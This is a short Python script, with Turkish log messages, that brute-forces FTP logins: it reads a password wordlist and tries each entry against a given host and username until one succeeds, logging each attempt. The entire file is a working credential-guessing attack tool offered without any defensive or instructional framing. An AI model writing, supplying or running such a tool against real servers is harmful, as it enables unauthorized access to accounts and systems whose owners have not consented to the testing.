from ftplib import FTP
from utils import log_success, log_fail

def ftp_bruteforce(host, username, wordlist_path):
    with open(wordlist_path, "r") as f:
        for password in f:
            password = password.strip()
            try:
                ftp = FTP(host)
                ftp.login(user=username, passwd=password)
                log_success(f"[+] Giriş başarılı: {password}")
                ftp.quit()
                return
            except:
                log_fail(f"[-] Hatalı parola: {password}")
